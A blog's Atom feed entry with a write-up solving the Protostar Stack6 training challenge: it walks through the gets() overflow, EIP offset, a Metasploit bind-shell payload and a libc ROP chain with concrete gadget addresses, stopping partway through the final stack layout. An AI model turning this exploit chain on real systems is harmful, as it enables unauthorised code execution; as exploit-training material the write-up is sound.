<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom"><title>Nildram</title><link href="http://nildram.io/" rel="alternate"></link><link href="http://nildram.io/feeds/all.atom.xml" rel="self"></link><id>http://nildram.io/</id><updated>2015-03-06T10:20:00+01:00</updated><entry><title>Protostar Stack6 - ROP Solution</title><link href="http://nildram.io/protostar-stack6-rop-solution.html" rel="alternate"></link><updated>2015-03-06T10:20:00+01:00</updated><author><name>Nildram</name></author><id>tag:nildram.io,2015-03-06:protostar-stack6-rop-solution.html</id><summary type="html">&lt;p&gt;I've recently been revisiting the &lt;a href="https://exploit-exercises.com/protostar/"&gt;Protostar&lt;/a&gt; challenges from &lt;a href="https://exploit-exercises.com/"&gt;Exploit Exercises&lt;/a&gt;. Having prevously only completed the &lt;a href="https://exploit-exercises.com/protostar/stack6/"&gt;Stack6&lt;/a&gt; challenge using the duplicate payload and &lt;a href="http://goo.gl/Tg1MN9"&gt;return-to-libc&lt;/a&gt; methods suggested in the description, I thought I would run through a ROP solution and writeup the steps as I go.&lt;/p&gt;
&lt;p&gt;I'll skip any introduction to what is ROP for now as there's plenty of &lt;a href="https://goo.gl/trusVL"&gt;other reading material&lt;/a&gt; already available which covers this.&lt;/p&gt;
&lt;p&gt;The source code for the challenge is as follows:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="cp"&gt;#include &amp;lt;stdlib.h&amp;gt;&lt;/span&gt;
&lt;span class="cp"&gt;#include &amp;lt;unistd.h&amp;gt;&lt;/span&gt;
&lt;span class="cp"&gt;#include &amp;lt;stdio.h&amp;gt;&lt;/span&gt;
&lt;span class="cp"&gt;#include &amp;lt;string.h&amp;gt;&lt;/span&gt;

&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;getpath&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;64&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
  &lt;span class="kt"&gt;unsigned&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;ret&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

  &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;input path please: &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="n"&gt;fflush&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;stdout&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

  &lt;span class="n"&gt;gets&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

  &lt;span class="n"&gt;ret&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;__builtin_return_address&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

  &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;ret&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt; &lt;span class="mh"&gt;0xbf000000&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mh"&gt;0xbf000000&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;bzzzt (%p)&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;ret&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
      &lt;span class="n"&gt;_exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;

  &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;got path %s&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;argc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="n"&gt;getpath&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The basic idea is pretty straight forward; exploit the program to get arbitrary code execution. However, we can see that there are some restrictions on the return address that can be used.&lt;/p&gt;
&lt;p&gt;As suggested in the description, there are multiple ways around this restriction, but we will just look at the ROP technique.&lt;/p&gt;
&lt;h2&gt;Controlling EIP&lt;/h2&gt;
&lt;p&gt;Before we do anything else, let's start off by gaining control over EIP.&lt;/p&gt;
&lt;p&gt;We'll use Metasploit's &lt;code&gt;pattern_create&lt;/code&gt; and &lt;code&gt;pattern_offset&lt;/code&gt; tools to help us figure this one out.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;root@kali:~# /usr/share/metasploit-framework/tools/pattern_create.rb 100 &amp;gt; inputroot@kali:~# gdb -q ./stack6
Reading symbols from /root/stack6...done.
gdb&lt;span class="nv"&gt;$ &lt;/span&gt;r &amp;lt; input
input path please: got path Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A6Ac72Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

Program received signal SIGSEGV, Segmentation fault.
--------------------------------------------------------------------------&lt;span class="o"&gt;[&lt;/span&gt;regs&lt;span class="o"&gt;]&lt;/span&gt;
  EAX: 0x0000006E  EBX: 0xF7FBBFF4  ECX: 0xFFFFD408  EDX: 0xF7FBD360  o d I t S z A P c 
  ESI: 0x00000000  EDI: 0x00000000  EBP: 0x63413563  ESP: 0xFFFFD490  EIP: 0x37634136
  CS: 0023  DS: 002B  ES: 002B  FS: 0000  GS: 0063  SS: 002BError &lt;span class="k"&gt;while &lt;/span&gt;running hook_stop:
Cannot access memory at address 0x37634136
0x37634136 in ?? &lt;span class="o"&gt;()&lt;/span&gt;
gdb&lt;span class="nv"&gt;$ &lt;/span&gt;q
root@kali:~# /usr/share/metasploit-framework/tools/pattern_offset.rb 0x37634136
&lt;span class="o"&gt;[&lt;/span&gt;*&lt;span class="o"&gt;]&lt;/span&gt; Exact match at offset 80
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Great so now we know that we need a payload with 80 junk bytes before we overwrite the return address of the &lt;code&gt;getpath()&lt;/code&gt; function.&lt;/p&gt;
&lt;h2&gt;Plan&lt;/h2&gt;
&lt;p&gt;Now let's do some planning. Our goal will be to use a ROP chain to execute a TCP bind shell. We will use Metasploit to generate our bind shell and copy it over to the target as &lt;code&gt;/tmp/pwn&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;root@kali:~# msfpayload linux/x86/shell_bind_tcp X &amp;gt; linux-bind-shell-tcp
Created by msfpayload &lt;span class="o"&gt;(&lt;/span&gt;http://www.metasploit.com&lt;span class="o"&gt;)&lt;/span&gt;.
Payload: linux/x86/shell_bind_tcp
 Length: 78
Options: &lt;span class="o"&gt;{}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We will cause the target program to execute the bind shell with the following command:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="n"&gt;execv&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/tmp/pwn&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;},&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;})&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Let's break this down into steps:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Get our arguments into memory. We just need to get the string &lt;code&gt;/tmp/pwn&lt;/code&gt; into memory and follow it with a &lt;code&gt;NULL&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Setup registers.&lt;/li&gt;
&lt;li&gt;Get argument of first argument into &lt;code&gt;ebx&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Move address of second argument into &lt;code&gt;ecx&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Move address of third argument into &lt;code&gt;edx&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Call &lt;code&gt;execv&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Move system call number &lt;code&gt;0x0b&lt;/code&gt; into &lt;code&gt;eax&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Call &lt;code&gt;int 0x80&lt;/code&gt; to envoke the call.&lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;Getting our arguments into memory&lt;/h3&gt;
&lt;p&gt;First we need to get the arguments to the &lt;code&gt;execve&lt;/code&gt; call into memory. We just need the single array of &lt;code&gt;char*&lt;/code&gt; passed into the second argument of &lt;code&gt;execve&lt;/code&gt; as shown above with the last &lt;code&gt;char*&lt;/code&gt; being NULL. The first argument will point to the first element in the array, whist the third argument will point to the last element in the array.&lt;/p&gt;
&lt;p&gt;We could just pass this in on the stack as arguments to the program, but the address of the arguments would be liable to change even without ASLR. Intead, we will pass them in as part of our buffer and arrange them in memory ourselves. We will use the data section to store these parameters:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;user@protostar:~&lt;span class="nv"&gt;$ &lt;/span&gt;objdump -D /opt/protostar/bin/stack6 | grep __data
08049710 &amp;lt;__data_start&amp;gt;:
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Now we need some ROP gadgets. There's a tool for those, or rather a number of tools for those.&lt;/p&gt;
&lt;p&gt;I'm going to go ahead and use &lt;code&gt;rp&lt;/code&gt; from &lt;a href="https://github.com/0vercl0k/rp"&gt;here&lt;/a&gt; because I can use a precompiled binary to avoid any dependency issues and because I'm a C++ fan.&lt;/p&gt;
&lt;h4&gt;File path&lt;/h4&gt;
&lt;p&gt;Let's start by getting our file path &lt;code&gt;/tmp/pwn&lt;/code&gt; into program memory. Here are the steps broken down along with the gadgets we will need to find:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Load 4 bytes of our arguments into some register. We will need a &lt;code&gt;pop r1; ret&lt;/code&gt; gadget here.&lt;/li&gt;
&lt;li&gt;Move the contents of that register into memory. We will need a &lt;code&gt;pop r2; ret&lt;/code&gt; to load the target memory address and then a &lt;code&gt;mov [r2] r1; ret&lt;/code&gt; to do the move.&lt;/li&gt;
&lt;li&gt;Repeat steps 1 and 2 for successive 4 byte chunks, updating the address &lt;code&gt;[r2]&lt;/code&gt; each time. We can also add a &lt;code&gt;NULL&lt;/code&gt; on the end to terminate the string and provide the &lt;code&gt;NULL&lt;/code&gt; for arguments two and three of the call to &lt;code&gt;execve&lt;/code&gt;.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Let's look for these gadgets. There's not alot to go on in the &lt;code&gt;stack6&lt;/code&gt; binary itself, so we look in &lt;code&gt;libc&lt;/code&gt; as this is also linked in. We'll start with the &lt;code&gt;mov&lt;/code&gt;, so we an identify which register we need to pop into, then the two &lt;code&gt;pop&lt;/code&gt; gadgets.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;user@protostar:~&lt;span class="nv"&gt;$ &lt;/span&gt;./rp-lin-x86 -f /lib/libc-2.11.2.so --rop&lt;span class="o"&gt;=&lt;/span&gt;4 --unique | grep &lt;span class="s2"&gt;&amp;quot; mov dword \[ecx\]&amp;quot;&lt;/span&gt;
...
0x00074997: mov dword &lt;span class="o"&gt;[&lt;/span&gt;ecx&lt;span class="o"&gt;]&lt;/span&gt;, edx ; ret  ;  &lt;span class="o"&gt;(&lt;/span&gt;1 found&lt;span class="o"&gt;)&lt;/span&gt;
...
user@protostar:~&lt;span class="nv"&gt;$ &lt;/span&gt;./rp-lin-x86 -f /lib/libc-2.11.2.so --rop&lt;span class="o"&gt;=&lt;/span&gt;4 --unique | grep &lt;span class="s2"&gt;&amp;quot;pop edx ; ret&amp;quot;&lt;/span&gt;
...
0x00001a9e: pop edx ; ret  ;  &lt;span class="o"&gt;(&lt;/span&gt;6 found&lt;span class="o"&gt;)&lt;/span&gt;
...
user@protostar:~&lt;span class="nv"&gt;$ &lt;/span&gt;./rp-lin-x86 -f /lib/libc-2.11.2.so --rop&lt;span class="o"&gt;=&lt;/span&gt;4 --unique | grep &lt;span class="s2"&gt;&amp;quot;pop ecx ; ret&amp;quot;&lt;/span&gt;
...
0x0013519d: pop ecx ; ret  ;  &lt;span class="o"&gt;(&lt;/span&gt;1 found&lt;span class="o"&gt;)&lt;/span&gt;
...
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We can get the absolute address of this by adding it to the base address of &lt;code&gt;libc&lt;/code&gt; which we can get from &lt;code&gt;/proc/&amp;lt;pid&amp;gt;/maps&lt;/code&gt; as shown below.  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;user@protostar:~&lt;span class="nv"&gt;$ &lt;/span&gt;gdb -q /opt/protostar/bin/stack6
Reading symbols from /opt/protostar/bin/stack6...done.
gdb&lt;span class="nv"&gt;$ &lt;/span&gt;b main
Breakpoint 1 at 0x8048500: file stack6/stack6.c, line 27.
gdb&lt;span class="nv"&gt;$ &lt;/span&gt;r
Breakpoint 1, main &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;argc&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;0x1, &lt;span class="nv"&gt;argv&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;0xbffff874&lt;span class="o"&gt;)&lt;/span&gt; at stack6/stack6.c:27
27  stack6/stack6.c: No such file or directory.
    in stack6/stack6.c
gdb&lt;span class="nv"&gt;$ &lt;/span&gt;info proc
process 2080
&lt;span class="nv"&gt;cmdline&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;/opt/protostar/bin/stack6&amp;#39;&lt;/span&gt;
&lt;span class="nv"&gt;cwd&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;/home/user&amp;#39;&lt;/span&gt;
&lt;span class="nv"&gt;exe&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;/opt/protostar/bin/stack6&amp;#39;&lt;/span&gt;
gdb&lt;span class="nv"&gt;$ &lt;/span&gt;shell
&lt;span class="nv"&gt;$ &lt;/span&gt;cat /proc/2080/maps
08048000-08049000 r-xp 00000000 00:10 3537       /opt/protostar/bin/stack6
08049000-0804a000 rwxp 00000000 00:10 3537       /opt/protostar/bin/stack6
b7e96000-b7e97000 rwxp 00000000 00:00 0
b7e97000-b7fd5000 r-xp 00000000 00:10 759        /lib/libc-2.11.2.so
b7fd5000-b7fd6000 ---p 0013e000 00:10 759        /lib/libc-2.11.2.so
b7fd6000-b7fd8000 r-xp 0013e000 00:10 759        /lib/libc-2.11.2.so
b7fd8000-b7fd9000 rwxp 00140000 00:10 759        /lib/libc-2.11.2.so
b7fd9000-b7fdc000 rwxp 00000000 00:00 0
b7fe0000-b7fe2000 rwxp 00000000 00:00 0
b7fe2000-b7fe3000 r-xp 00000000 00:00 0          &lt;span class="o"&gt;[&lt;/span&gt;vdso&lt;span class="o"&gt;]&lt;/span&gt;
b7fe3000-b7ffe000 r-xp 00000000 00:10 741        /lib/ld-2.11.2.so
b7ffe000-b7fff000 r-xp 0001a000 00:10 741        /lib/ld-2.11.2.so
b7fff000-b8000000 rwxp 0001b000 00:10 741        /lib/ld-2.11.2.so
bffeb000-c0000000 rwxp 00000000 00:00 0          &lt;span class="o"&gt;[&lt;/span&gt;stack&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We need to setup our stack as follows using the &lt;code&gt;libc&lt;/code&gt; base of &lt;code&gt;0xb7e97000&lt;/code&gt;. &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;lower memory&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="kc"&gt;...&lt;/span&gt;
&lt;span class="c1"&gt;# Load the target address in .data&lt;/span&gt;
    &lt;span class="mh"&gt;0xb7fcc19d&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; Return address &lt;span class="p"&gt;(&lt;/span&gt;pop ecx&lt;span class="p"&gt;;&lt;/span&gt; ret&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="mh"&gt;0x08049710&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; Target memory address &lt;span class="kr"&gt;in&lt;/span&gt; .data
&lt;span class="c1"&gt;# Load the first part of our string &amp;quot;/tmp&amp;quot; into edx&lt;/span&gt;
    &lt;span class="mh"&gt;0xb7e98a9e&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; Return address &lt;span class="p"&gt;(&lt;/span&gt;pop edx&lt;span class="p"&gt;;&lt;/span&gt; ret&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="s"&gt;&amp;quot;/tmp&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; First part of our string &lt;span class="o"&gt;/&lt;/span&gt;tmp
&lt;span class="c1"&gt;# Perform to move from edx to the .data segment&lt;/span&gt;
    &lt;span class="mh"&gt;0xb7f0b997&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; Return address &lt;span class="p"&gt;(&lt;/span&gt;mov dword &lt;span class="p"&gt;[&lt;/span&gt;ecx&lt;span class="p"&gt;],&lt;/span&gt; edx&lt;span class="p"&gt;;&lt;/span&gt; ret&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="c1"&gt;# Load the next target address in .data&lt;/span&gt;
    &lt;span class="mh"&gt;0xb7fcc19d&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; Return address &lt;span class="p"&gt;(&lt;/span&gt;pop ecx&lt;span class="p"&gt;;&lt;/span&gt; ret&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="mh"&gt;0x08049714&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; Target memory address &lt;span class="kr"&gt;in&lt;/span&gt; .data &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="m"&gt;4&lt;/span&gt; bytes
&lt;span class="c1"&gt;# Load the second part of our string &amp;quot;/pwn&amp;quot; into edx &lt;/span&gt;
    &lt;span class="mh"&gt;0xb7e98a9e&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; Return address &lt;span class="p"&gt;(&lt;/span&gt;pop edx&lt;span class="p"&gt;;&lt;/span&gt; ret&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="s"&gt;&amp;quot;/pwn&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; Second part of our string &lt;span class="o"&gt;/&lt;/span&gt;pwn
&lt;span class="c1"&gt;# Perform the move to .data&lt;/span&gt;
    &lt;span class="mh"&gt;0xb7f0b997&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; Return address &lt;span class="p"&gt;(&lt;/span&gt;mov dword &lt;span class="p"&gt;[&lt;/span&gt;ecx&lt;span class="p"&gt;],&lt;/span&gt; edx&lt;span class="p"&gt;;&lt;/span&gt; ret&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="c1"&gt;# Load the final target address in .data&lt;/span&gt;
    &lt;span class="mh"&gt;0xb7fcc19d&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; Return address &lt;span class="p"&gt;(&lt;/span&gt;pop ecx&lt;span class="p"&gt;;&lt;/span&gt; ret&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="mh"&gt;0x08049718&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; Target memory address &lt;span class="kr"&gt;in&lt;/span&gt; .data &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="m"&gt;4&lt;/span&gt; bytes
&lt;span class="c1"&gt;# Load the NULL into edx &lt;/span&gt;
    &lt;span class="mh"&gt;0xb7e98a9e&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; Return address &lt;span class="p"&gt;(&lt;/span&gt;pop edx&lt;span class="p"&gt;;&lt;/span&gt; ret&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="mh"&gt;0x00000000&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; &lt;span class="kc"&gt;NULL&lt;/span&gt; bytes
&lt;span class="c1"&gt;# Perform the move to .data&lt;/span&gt;
    &lt;span class="mh"&gt;0xb7f0b997&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; Return address &lt;span class="p"&gt;(&lt;/span&gt;mov dword &lt;span class="p"&gt;[&lt;/span&gt;ecx&lt;span class="p"&gt;],&lt;/span&gt; edx&lt;span class="p"&gt;;&lt;/span&gt; ret&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="kc"&gt;...&lt;/span&gt;
&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;higher memory&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Setting up the registers&lt;/h3&gt;
&lt;p&gt;Next step it to place the arguments in the three registers &lt;code&gt;ebx&lt;/code&gt;, &lt;code&gt;ecx&lt;/code&gt; and &lt;code&gt;edx&lt;/code&gt;, so we need to find a &lt;code&gt;pop&lt;/code&gt; for each.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;user@protostar:~&lt;span class="nv"&gt;$ &lt;/span&gt;./rp-lin-x86 -f /lib/libc-2.11.2.so -r 4 --unique | grep &lt;span class="s2"&gt;&amp;quot; pop ebx&amp;quot;&lt;/span&gt; --color
...
0x000d8a81: pop edx ; pop ecx ; pop ebx ; ret  ;  &lt;span class="o"&gt;(&lt;/span&gt;1 found&lt;span class="o"&gt;)&lt;/span&gt;
...
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Here we've found all three in a single gadget. Awesome! Let's add the following to our stack layout.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;lower memory&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="kc"&gt;...&lt;/span&gt;
&lt;span class="c1"&gt;# Load registers&lt;/span&gt;
    &lt;span class="mh"&gt;0xb7f6fa81&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; Return address &lt;span class="p"&gt;(&lt;/span&gt;pop edx&lt;span class="p"&gt;;&lt;/span&gt; pop ecx&lt;span class="p"&gt;;&lt;/span&gt; pop ebx&lt;span class="p"&gt;;&lt;/span&gt; ret&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="mh"&gt;0x08049718&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; Argument &lt;span class="m"&gt;3&lt;/span&gt; destined &lt;span class="kr"&gt;for&lt;/span&gt; edx &lt;span class="o"&gt;-&lt;/span&gt; address of &lt;span class="kc"&gt;NULL&lt;/span&gt;
    &lt;span class="mh"&gt;0x08049718&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; Argument &lt;span class="m"&gt;2&lt;/span&gt; destined &lt;span class="kr"&gt;for&lt;/span&gt; ecx &lt;span class="o"&gt;-&lt;/span&gt; address of &lt;span class="kc"&gt;NULL&lt;/span&gt;
    &lt;span class="mh"&gt;0x08049710&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; Argument &lt;span class="m"&gt;1&lt;/span&gt; destined &lt;span class="kr"&gt;for&lt;/span&gt; ebx &lt;span class="o"&gt;-&lt;/span&gt; address of &lt;span class="s"&gt;&amp;quot;/tmp/pwn&amp;quot;&lt;/span&gt;
&lt;span class="kc"&gt;...&lt;/span&gt;
&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;higher memory&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Calling &lt;code&gt;execve&lt;/code&gt;&lt;/h3&gt;
&lt;p&gt;We need two more gadgets to load the system call number into eax and to envoke it. Luckily for us, &lt;code&gt;libc&lt;/code&gt; contains a gadget that serves both purposes:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;user@protostar:~&lt;span class="nv"&gt;$ &lt;/span&gt;./rp-lin-x86 -f /lib/libc-2.11.2.so --rop&lt;span class="o"&gt;=&lt;/span&gt;4 --unique | grep &lt;span class="s2"&gt;&amp;quot;0x0000000B&amp;quot;&lt;/span&gt; ; int 0x80&lt;span class="err"&gt;&amp;quot;&lt;/span&gt;
...
0x00097193: mov eax, 0x0000000B ; int 0x80 ;  &lt;span class="o"&gt;(&lt;/span&gt;1 found&lt;span class="o"&gt;)&lt;/span&gt;
...
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Our finished stack layout should look like this:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;lower memory&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="kc"&gt;...&lt;/span&gt;
&lt;span class="c1"&gt;# Load the target address in .data&lt;/span&gt;
    &lt;span class="mh"&gt;0xb7fcc19d&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; Return address &lt;span class="p"&gt;(&lt;/span&gt;pop ecx&lt;span class="p"&gt;;&lt;/span&gt; ret&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="mh"&gt;0x08049710&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; Target memory address &lt;span class="kr"&gt;in&lt;/span&gt; .data
&lt;span class="c1"&gt;# Load the first part of our string &amp;quot;/tmp&amp;quot; into edx&lt;/span&gt;
    &lt;span class="mh"&gt;0xb7e98a9e&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; Return address &lt;span class="p"&gt;(&lt;/span&gt;pop edx&lt;span class="p"&gt;;&lt;/span&gt; ret&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="s"&gt;&amp;quot;/tmp&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; First part of our string &lt;span class="o"&gt;/&lt;/span&gt;tmp
&lt;span class="c1"&gt;# Perform to move from edx to the .data segment&lt;/span&gt;
    &lt;span class="mh"&gt;0xb7f0b997&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; Return address &lt;span class="p"&gt;(&lt;/span&gt;mov dword &lt;span class="p"&gt;[&lt;/span&gt;ecx&lt;span class="p"&gt;],&lt;/span&gt; edx&lt;span class="p"&gt;;&lt;/span&gt; ret&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="c1"&gt;# Load the next target address in .data&lt;/span&gt;
    &lt;span class="mh"&gt;0xb7fcc19d&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; Return address &lt;span class="p"&gt;(&lt;/span&gt;pop ecx&lt;span class="p"&gt;;&lt;/span&gt; ret&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="mh"&gt;0x08049714&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; Target memory address &lt;span class="kr"&gt;in&lt;/span&gt; .data &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="m"&gt;4&lt;/span&gt; bytes
&lt;span class="c1"&gt;# Load the second part of our string &amp;quot;/pwn&amp;quot; into edx &lt;/span&gt;
